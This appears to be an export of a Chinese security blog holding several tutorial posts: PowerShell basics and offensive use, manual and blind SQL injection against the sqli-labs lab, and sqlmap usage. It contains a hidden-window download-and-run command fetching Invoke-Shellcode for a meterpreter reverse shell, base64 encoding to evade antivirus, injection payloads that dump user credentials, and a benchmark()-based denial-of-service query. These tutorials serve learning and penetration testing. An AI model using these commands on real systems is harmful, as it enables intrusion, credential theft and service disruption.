<h2 id="powershell基本概念"><a href="#powershell基本概念" class="headerlink" title="powershell基本概念"></a>powershell基本概念</h2><h3 id="ps1文件"><a href="#ps1文件" class="headerlink" title=".ps1文件"></a>.ps1文件</h3><p>一个powershell脚本其实就是一个简单的文本文件，其扩展名为<code>.ps1</code>。</p>
<p>powershell脚本文件中包含一系列powershell命令，每个命令显示为单独的一行。</p>
<h3 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h3><p>为了防止使用者运行恶意脚本，powershell提供了一个执行策略，默认不能执行。</p>
<p>如果powershell脚本无法运行，可以使用下面的cmdlet命令查询当前的执行策略。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-exccutionPolicy</span></span><br><span class="line"><span class="number">1</span>. Restricted  <span class="comment"># 脚本不能运行（默认设置）</span></span><br><span class="line"><span class="number">2</span>. RemoteSigned <span class="comment"># 在本地创建的脚本可以运行，但从网上下载的脚本不能运行（拥有数字证书签名的除外）</span></span><br><span class="line"><span class="number">3</span>. AllSigned  <span class="comment"># 仅当脚本由受信任的发布者签名时才能运行</span></span><br><span class="line"><span class="number">4</span>. Unrestricted <span class="comment"># 允许所有脚本运行</span></span><br></pre></td></tr></table></figure>

<p>可以使用下面的cmdlet命令设置powershell的执行策略</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> &lt;policy name&gt;</span><br></pre></td></tr></table></figure>

<h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><p>要想运行一个powershell脚本，必须输入完整的路径和文件名。</p>
<p>若在同一目录下，<code>./test.ps1</code>即可</p>
<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>管道的作用是将一个命令的输出作为另一个命令的输入，两个命令之间用 <code>|</code> 连接</p>
<p>例：执行下面命令，让所有正在运行的，名字以字符 p 开头的程序停止运行</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">get-process</span> p* | <span class="built_in">stop-process</span></span><br></pre></td></tr></table></figure>

<h2 id="powershell常用命令"><a href="#powershell常用命令" class="headerlink" title="powershell常用命令"></a>powershell常用命令</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>在powershell下，类似cmd命令的命令叫作cmdlet命令。二者命名规范一致，都采用“动词-名词”的形式，例如“New-Item”。动词一般为<code>Add</code>，<code>Get</code>，<code>Remove</code>，<code>Set</code>，<code>New</code>等。</p>
<p>powershell命令不区分大小写。</p>
<p>以文件操作为例：</p>
<ul>
<li>新建目录：<code>New-Item whitecellclub-ItemType Directory</code></li>
<li>新建文件：<code>New-Item light.txt-ItemType File</code></li>
<li>删除目录：<code>Remove-Item whitecellclub</code></li>
<li>显示文本内容：<code>Get-Content test.txt</code></li>
<li>设置文本内容：<code>Set-Content test.txt-Value &quot;hello,world!&quot;</code></li>
<li>追加内容：<code>Add-Content light.txt-Value &quot;hahaha&quot;</code></li>
<li>清除内容：<code>Clear-Content test.txt</code></li>
</ul>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>在Windows终端下输入 <code>powershell</code>，进入powershell命令行环境。输入 <code>help</code> 显示帮助菜单</p>
<p><img src="/posts/57592/F:%5Cimages%5Cimage-20200319175708381.png" alt="image-20200319175708381"></p>
<p>要想运行powershell脚本程序，必须使用管理员权限将策略从<code>Restricted</code>改成<code>Unrestricted</code></p>
<ol>
<li><p>绕过本地权限并执行</p>
<p>将PowerUp.ps1上传到目标服务器。在命令行下执行如下命令，绕过安全策略，在目标服务器执行该脚本</p>
</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Powershell.exe <span class="literal">-ExecutionPolicy</span> Bypass <span class="operator">-File</span> PowerUp.ps1</span><br></pre></td></tr></table></figure>

<p><img src="/posts/57592/F:%5Cimages%5Cimage-20200320092852102.png" alt="image-20200320092852102"></p>
<p>将同一个脚本上传到目标服务器中，在目标本地执行脚本文件</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-Command</span> <span class="string">"&amp; &#123;Import-Module C:\PowerUp.ps1; Invoke-AllChecks&#125;"</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>从网站服务器中下载脚本，绕过本地权限并隐藏执行</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-ExecutionPolicy</span> Bypass<span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span><span class="literal">-NoProfile</span><span class="literal">-NonIIEX</span>(<span class="built_in">New-ObjectNet</span>.WebClient).DownloadString(<span class="string">"xxx.ps1"</span>);[<span class="type">Parameters</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-ExecutionPolicy</span> Bypass<span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span><span class="literal">-NoProfile</span><span class="literal">-NonIIEX</span>(<span class="built_in">New-ObjectNet</span>.WebClient).DownloadString(<span class="string">"https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1"</span>); <span class="built_in">Invoke-Shellcode</span> <span class="literal">-Payload</span> windows/meterpreter/reverse_https <span class="literal">-Lhost</span> <span class="number">192.168</span>.<span class="number">150.141</span> <span class="literal">-Lport</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>

<ul>
<li>-ExecutionPolicy Bypass (-Exec Bypass)：绕过执行安全策略。这个参数非常重要。在默认情况下，powershell的安全策略规定powershell不能运行命令和文件。</li>
<li>-WindowStyle Hidden (-W Hidden)：隐藏窗口</li>
<li>-NonInteractive (-NonI)：非交互模式。powershell不为用户提供交互式的提示</li>
<li>-NoProfile (-NoP)：powershell控制台不加载当前用户的配置文件</li>
<li>-noexit：执行后不退出shell。这个参数在使用键盘记录等脚本时非常重要</li>
<li>-NoLogo：启动不显示版权标志的powershell</li>
</ul>
<ol start="3">
<li><p>使用base64对powershell命令进行编码</p>
<p>使用Base64对powershell命令进行编码的目的是混淆和压缩代码，从而避免脚本因为一些特殊字符被杀毒软件查杀。</p>
<p>可以使用python脚本对所有的powershell命令进行base64编码。<a href="https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py" target="_blank" rel="noopener">python脚本</a></p>
<p>在使用ps_encoder.py进行文本转换时，转换的对象必须是文本文件，因此先把命令保存为文本文件。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">echo <span class="string">"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1');Invoke-Shellcode-Payload windows/meterpreter/reverse_https -Lhost 192.168.150.141 -Lport 80 -Force"</span> &gt;raw.txt</span><br></pre></td></tr></table></figure>

<p><img src="/posts/57592/F:%5Cimages%5Cimage-20200320110707604.png" alt="image-20200320110707604"></p>
<p>在远程主机上执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc base64编码</span><br></pre></td></tr></table></figure>


</li>
</ol>
<h3 id="运行32位和64位powershell"><a href="#运行32位和64位powershell" class="headerlink" title="运行32位和64位powershell"></a>运行32位和64位powershell</h3><p>一些powershell脚本只能在指定平台上运行。在64位的Windows操作系统中，存在两个版本的powershell，一个是x64，另一个是x86。这两个版本的执行策略不会相互影响，可以把它们看成两个独立的程序。x64版本的powershell的配置文件在 <code>%windir%\syswow64\WindowsPowerShell\v1.0\</code>目录下。</p>
<p>运行32位Powershell脚本</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-NoP</span> <span class="literal">-NonI</span> <span class="literal">-W</span> <span class="keyword">Hidden</span> <span class="literal">-Exec</span> Bypass</span><br></pre></td></tr></table></figure>

<p>运行64位Powershell脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%windir%\syswow64\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass</span><br></pre></td></tr></table></figure>

<h3 id="推荐"><a href="#推荐" class="headerlink" title="推荐"></a>推荐</h3><p><a href="https://www.pstips.net/powershell-online-tutorials" target="_blank" rel="noopener">PowerShell 在线教程</a></p>
]]></content>
      <tags>
        <tag>Powershell</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入之手工注入</title>
    <url>/posts/42669.html</url>
    <content><![CDATA[<p><img src="/posts/42669/sql1.png" alt></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>手工注入虽然原理是一样的，但是在具体手工注入的过程中有好多各种各样的细节不太一样，特此记录汇总下，以方便以后的学习查询。</p>
<a id="more"></a>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="注释或闭合语句"><a href="#注释或闭合语句" class="headerlink" title="注释或闭合语句"></a>注释或闭合语句</h3><p>首先看下一个基本的SQL语句查询源码：</p>
<p><strong><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></strong></p>
<p><img src="/posts/42669/sql2.jpg" alt><br>下面的步骤默认都是采用这种基本的SQL语句的，其他的注入方法换汤不换药，这里只是想整理下注入的步骤与关键性的语句。</p>
<h3 id="引导闭合语句"><a href="#引导闭合语句" class="headerlink" title="引导闭合语句"></a>引导闭合语句</h3><p><code>id =1 &#39; and &#39;1&#39; =&#39;1</code></p>
<p>带入进源码中的SQL语句就是:</p>
<p><code>SELECT * FROM users WHERE id=&#39;1 &#39; and &#39;1&#39; = &#39;1&#39; LIMIT 0,1</code></p>
<h3 id="注释后面语句"><a href="#注释后面语句" class="headerlink" title="注释后面语句"></a>注释后面语句</h3><p>常用的注释payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or 1&#x3D;1--+</span><br><span class="line">&#39;or 1&#x3D;1--+</span><br><span class="line">&quot;or 1&#x3D;1--+</span><br><span class="line">)or 1&#x3D;1--+</span><br><span class="line">&#39;)or 1&#x3D;1--+</span><br><span class="line">&quot;) or 1&#x3D;1--+</span><br><span class="line">&quot;))or 1&#x3D;1--+</span><br><span class="line">--+ 可以用#替换，url 提交过程中 Url 编码后的#为%23</span><br></pre></td></tr></table></figure>

<p>带入进源码中的SQL语句就是:</p>
<p><code>SELECT * FROM users WHERE id=&#39;&#39;or 1=1--+&#39; LIMIT 0,1</code></p>
<p>这样可以看出直接把后面的语句都给注释掉了，一般实战用注释比较多。</p>
<h3 id="and验证"><a href="#and验证" class="headerlink" title="and验证"></a>and验证</h3><p>当然这里 and 验证和 or 验证都可以，二者区别不大:</p>
<p><strong>页面返回正常</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and 1&#x3D;1 --+</span><br><span class="line">?id&#x3D;1&#39; or 1&#x3D;2 --+</span><br></pre></td></tr></table></figure>
<p><strong>页面返回异常</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and 1&#x3D;2 --+</span><br><span class="line">?id&#x3D;1&#39; or 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>

<p>如果发现一开始页面先是正常然后是异常的话，说明页面啊存在注入。当然这里是最基本的判断方法，到后面盲注的时候是用延时函数来观察页面的返回时间的。</p>
<h3 id="查询字段数目"><a href="#查询字段数目" class="headerlink" title="查询字段数目"></a>查询字段数目</h3><p>查询字段数目主要利用MySQL里面的 order by 来判断字段数目，order by一般采用数学中的对半查找来判断具体的字段数目，这样效率会很高，下面假设用 order by 来判断一个未知字段的注入。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 1 –-+ 此时页面正常，继续换更大的数字测试</span><br><span class="line">?id&#x3D;1&#39; order by 10 –-+ 此时页面返回错误，更换小的数字测试</span><br><span class="line">?id&#x3D;1&#39; order by 5 –-+ 此时页面依然报错，继续缩小数值测试</span><br><span class="line">?id&#x3D;1&#39; order by 3 –-+ 此时页面返回正常，更换大的数字测试</span><br><span class="line">?id&#x3D;1&#39; order by 4 –-+ 此时页面返回错误，3正常，4错误，说明字段数目就是 3</span><br></pre></td></tr></table></figure>
<p>通过数学的对半查找，确定字段数目。</p>
<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>UNION SELECT 联合查询，手工注入经典语句，作用是在后面通过UNION把我们的恶意注入语句接上去，带入数据库进行查询。<br>因为字段数目是:3,那么正规的语句如下:</p>
<p><code>?id=1&#39; UNION SELECT 1,2,3 --+</code></p>
<p>这里页面是不会报错的，此时我们带入数据库的语句为:</p>
<p><code>SELECT 1,2,3 这段语句没有任何意义，所以页面按返回正常。</code><br><img src="/posts/42669/sql3.jpg" alt="union查询"><br>但是为了信息收集，我们得知道当前这个页面里面的值，调用的具体是数据库中的哪个字段才可以，可以故意构造一个错误的语句，来爆出错误的字段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#39; UNION SELECT 1,2,3 –-+ 通过id&#x3D;-1 一个负数不存在的id值来触发报错</span><br><span class="line">id&#x3D;1&#39; and 1&#x3D;2 UNION SELECT 1,2,3 –-+ 通过and 1&#x3D;2 语句来触发报错</span><br><span class="line">id&#x3D;1&#39; or 1&#x3D;1 UNION SELECT 1,2,3 –-+ 通过or 1&#x3D;1 语句来触发报错</span><br></pre></td></tr></table></figure>

<h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>在爆出的字段值里面可以<code>替换</code>为我们的恶意语句，前期主要是收集信息，包括判断当前数据库是否是root用户，MySQL的版本等，一般收集这些信息常用一些MySQL自带的函数去收集信息:</p>
<p><strong>MySQL常用的系统函数:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">version()            #MySQL版本</span><br><span class="line">user()               #数据库用户名</span><br><span class="line">database()           #数据库名</span><br><span class="line">@@datadir            #数据库路径</span><br><span class="line">@@version_compile_os #操作系统版本</span><br></pre></td></tr></table></figure>

<p><strong>查询当前数据库名</strong></p>
<p><code>id=1&#39; and 1=2 UNION SELECT 1,database(),3 --+</code></p>
<p><img src="/posts/42669/sql4.jpg" alt><br><strong>查询MySQL版本</strong></p>
<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,version() --+</code></p>
<p><img src="/posts/42669/sql5.jpg" alt><br><strong>查询数据库用户和路径</strong></p>
<p><code>id=1&#39; and 1=2 UNION SELECT 1,user(),@@datadir --+</code></p>
<p><img src="/posts/42669/sql6.jpg" alt></p>
<h3 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h3><p>查询数据库，一般来说我们注入的时候要查的就是当前的数据库，但有时候root权限就NB了还可以看到网站数据库之外的数据库内容。</p>
<p><strong>查询当前数据库</strong></p>
<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,database() --+</code></p>
<p><img src="/posts/42669/sql7.jpg" alt><br>拿到当前的数据库名称为:<code>security</code></p>
<p><strong>查询所有数据库</strong><br>有时候忍不住想看下其他的数据库的内容，可以用这个语句查询所有的数据库:</p>
<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata --+</code></p>
<p><img src="/posts/42669/sql8.jpg" alt></p>
<h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><p><strong>database 查询数据库</strong></p>
<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></p>
<p><img src="/posts/42669/sql9.jpg" alt><br><strong>单引号-数据库</strong><br>这里的<code>database()</code>函数进行了数据库查询，因为我们已经查到了当前的数据库为<code>security</code>，所有这里还可以酱紫写，用单引号括把数据库的名称括起来<code>&#39;security&#39;</code>:</p>
<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; --+</code><br><img src="/posts/42669/sql10.jpg" alt><br><strong>hex编码数据库</strong><br>如果嫌单引号括起来麻烦的话，那么巧了！这里还有一个更麻烦的方法，就是将数据库名进行<code>hex</code>编码处理。<br>使用火狐自带的<code>HackBar</code>插件可以快速的进行<code>hex</code>编码:<br><img src="/posts/42669/sql11.gif" alt></p>
<p>hex编码后在前面加上0x表明这里是16进制编码。</p>
<p><img src="/posts/42669/sql12.jpg" alt></p>
<h3 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h3><p>目前收集到的信息为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据库名称: securuty</span><br><span class="line">数据库表名: emails,referers,uagents,users</span><br></pre></td></tr></table></figure>
<p>这几个表中 一般我们都会去 继续猜解<code>users</code>表。</p>
<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
<p><img src="/posts/42669/sql13.jpg" alt></p>
<h3 id="查询字段值"><a href="#查询字段值" class="headerlink" title="查询字段值"></a>查询字段值</h3><p>知道了数据库、表名、各个字段名可以直接进行查询了，不需借助<code>information_schanem</code>数据库了。</p>
<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(id,username,password) from users --+</code></p>
<p><img src="/posts/42669/sql14.jpg" alt></p>
<h2 id="简单整理"><a href="#简单整理" class="headerlink" title="简单整理"></a>简单整理</h2><p><code>order by –-+ 判断字段数目</code></p>
<p><code>union select –-+ 联合查询收集信息</code></p>
<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,database() –-+ 查询当前数据库</code></p>
<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata –-+查询所有数据库</code></p>
<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() –-+ 查询表名</code></p>
<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’ –-+ 查询列名</code></p>
<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(id,username,password) from users –-+ 查询字段值</code></p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入之盲注</title>
    <url>/posts/24339.html</url>
    <content><![CDATA[<h2 id="0x00-基于布尔盲注"><a href="#0x00-基于布尔盲注" class="headerlink" title="0x00 基于布尔盲注"></a>0x00 基于布尔盲注</h2><p>截取字符串常用函数：<br>① MID(column_name,start[,length])      //截取字符串的一部分</p>
<table>
<thead>
<tr>
<th>参数</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td>column_name</td>
<td align="center">必需。要提取字符的字段。</td>
</tr>
<tr>
<td>start</td>
<td align="center">必需。规定开始位置（起始值是 1）。</td>
</tr>
<tr>
<td>length</td>
<td align="center">可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</td>
</tr>
</tbody></table>
<p>例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str &#x3D; &quot;asdf&quot;</span><br><span class="line">p &#x3D; mid(str,2,1)</span><br><span class="line">p &#x3D; s</span><br></pre></td></tr></table></figure>

<p>Sql用例：</p>
<p>（1）MID(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。<br>（2）MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入。</p>
<p>② substr()函数</p>
<pre><code>Substr()和substring()函数实现的功能是一样的，均为截取字符串。

string substring(string, start, length)

string substr(string, start, length)

参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。</code></pre><p>Sql用例：</p>
<p>(1) substr(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，substr(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。<br>(2) substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处string参数可以为sql语句，可自行构造sql语句进行注入。</p>
<p>③ Left()函数</p>
<p>Left()得到字符串左部指定个数的字符</p>
<pre><code>Left ( string, n )        string为要截取的字符串，n为长度。</code></pre><p>Sql用例：</p>
<p>(1) left(database(),1)&gt;’a’,查看数据库名第一位，left(database(),2)&gt;’ab’,查看数据库名前二位。</p>
<p>(2) 同样的string可以为自行构造的sql语句。</p>
<p>同时也要介绍ORD()函数，此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用。</p>
<p>例如：</p>
<pre><code>ORD(MID(DATABASE(),1,1))&gt;114 意为检测database()的第一位ASCII码是否大于114，也即是‘r’</code></pre><h2 id="0x01-基于时间盲注"><a href="#0x01-基于时间盲注" class="headerlink" title="0x01 基于时间盲注"></a>0x01 基于时间盲注</h2><p>常用的判断语句:</p>
<pre><code>&apos; and if(1=0,1, sleep(10)) --+    

&quot; and if(1=0,1, sleep(10)) --+

) and if(1=0,1, sleep(10)) --+

&apos;) and if(1=0,1, sleep(10)) --+

&quot;) and if(1=0,1, sleep(10)) --+</code></pre><p><strong>1.爆数据库的版本长度</strong></p>
<p><a href="http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and</a> If(length((version()))=6,sleep(10),1)–+</p>
<p><strong>2.爆数据库版本的第一个字符</strong></p>
<p><a href="http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and</a> If(ascii(substr(version(),1,1))=53,sleep(10),1)–+</p>
<p><strong>3.爆第一个数据库的长度</strong></p>
<p><a href="http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and</a> If(length((select schema_name from information_schema.schemata limit 0,1))=18,sleep(10),1)–+</p>
<p><strong>4.爆第一个数据库的第一个字符</strong></p>
<p><a href="http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and</a> If(ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=105,sleep(10),1)–+<br>这里通过改变limit后的值来确定第几个数据库，第一个数据库的下标为0，依次往后推就是其他的数据库</p>
<p><strong>5.爆security数据库里的第四个表的长度</strong></p>
<p><a href="http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and</a> If(length((select table_name from information_schema.tables where table_schema=’security’ limit 3,1))=5,sleep(10),1)–+</p>
<p><strong>6.爆security数据库里的第四个表的第一个字符</strong><br><a href="http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and</a> If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 3,1),1,1))=117,sleep(10),1)–+</p>
<p><strong>7.爆security数据库里的users表的第二个字段长度</strong></p>
<p><a href="http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and</a> If(length((select column_name from information_schema.columns where table_schema=’security’ and table_name=’users’ limit 1,1))=8,sleep(10),1)–+</p>
<p><strong>8.爆security数据库里的users表的第二个字段的第一个字符</strong></p>
<p><a href="http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and</a> If(ascii(substr((select column_name from information_schema.columns where table_schema=’security’ and table_name=’users’ limit 1,1),1,1))=117,sleep(10),1)–+</p>
<p><strong>9.爆security数据库里的users表的第二个字段的第一个数据的长度</strong></p>
<p><a href="http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and</a> If(length((select username from security.users limit 0,1))=4,sleep(10),1)–+</p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap的基本使用</title>
    <url>/posts/8141.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>sqlmap也是渗透中常用的一个注入工具，据说，在注入工具方面，一个sqlmap就足够用了，只要你用的熟，秒杀各种工具，只是一个便捷性问题，sql注入另一方面就是手工党了，这个就另当别论了。今天我把一些SQLmap的使用整理一下。</p>
<a id="more"></a>
<h2 id="一共有11种常见SQLmap使用方法："><a href="#一共有11种常见SQLmap使用方法：" class="headerlink" title="一共有11种常见SQLmap使用方法："></a>一共有11种常见SQLmap使用方法：</h2><h3 id="SQLmap用于Access数据库注入"><a href="#SQLmap用于Access数据库注入" class="headerlink" title="SQLmap用于Access数据库注入"></a>SQLmap用于Access数据库注入</h3><ul>
<li><p>猜解是否能注入<br><code>python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</code></p>
</li>
<li><p>猜解表<br><code>python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --tables</code></p>
</li>
<li><p>根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)<br><code>python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --columns -T admin</code></p>
</li>
<li><p>根据字段猜解内容(假如通过3得到字段为username和password)<br><code>python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --dump -T admin -C &quot;username,password&quot;</code></p>
</li>
</ul>
<h3 id="SQLMAP用于Cookie注入"><a href="#SQLMAP用于Cookie注入" class="headerlink" title="SQLMAP用于Cookie注入"></a>SQLMAP用于Cookie注入</h3><ul>
<li><p>cookie注入，猜解表<br><code>python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --table --level 2</code></p>
</li>
<li><p>猜解字段，(通过1的表猜解字段，假如表为admin)<br><code>python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --columns -T admin --level 2</code></p>
</li>
<li><p>猜解内容<br><code>python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --dump -T
admin -C &quot;username,password&quot; --level 2</code></p>
</li>
</ul>
<h3 id="SQLMAP用于mysql中DDOS攻击"><a href="#SQLMAP用于mysql中DDOS攻击" class="headerlink" title="SQLMAP用于mysql中DDOS攻击"></a>SQLMAP用于mysql中DDOS攻击</h3><ul>
<li><p>获取一个Shell<br><code>python sqlmap.py -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell</code></p>
</li>
<li><p>输入执行语句完成DDOS攻击<br><code>select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f)</code></p>
</li>
</ul>
<h3 id="SQLMAP用于mysql注入"><a href="#SQLMAP用于mysql注入" class="headerlink" title="SQLMAP用于mysql注入"></a>SQLMAP用于mysql注入</h3><ul>
<li><p>查找数据库<br><code>python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; --dbs</code></p>
</li>
<li><p>通过第一步的数据库查找表(假如数据库名为dataname)<br><code>python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname --tables</code></p>
</li>
<li><p>通过2中的表得出列名(假如表为table_name)<br><code>python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name --columns</code></p>
</li>
<li><p>获取字段的值(假如扫描出id,user,password字段)<br><code>python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name -C
&quot;id,user,password&quot; --dump</code></p>
</li>
</ul>
<h3 id="SQLMAP中post登陆框注入"><a href="#SQLMAP中post登陆框注入" class="headerlink" title="SQLMAP中post登陆框注入"></a>SQLMAP中post登陆框注入</h3><h4 id="其中的search-test-txt是通过抓包工具burp-suite抓到的包并把数据保存为这个txt文件"><a href="#其中的search-test-txt是通过抓包工具burp-suite抓到的包并把数据保存为这个txt文件" class="headerlink" title="其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件"></a>其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件</h4><p>我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。</p>
<ol>
<li><p>浏览器打开目标地址http:// <a href="http://www.xxx.com" target="_blank" rel="noopener">www.xxx.com</a> /Login.asp</p>
</li>
<li><p>配置burp代理(127.0.0.1:8080)以拦截请求</p>
</li>
<li><p>点击login表单的submit按钮</p>
</li>
<li><p>这时候Burp会拦截到了我们的登录POST请求</p>
</li>
<li><p>把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</p>
</li>
<li><p>运行sqlmap并使用如下命令：<br><code>./sqlmap.py -r search-test.txt -p tfUPass</code></p>
</li>
</ol>
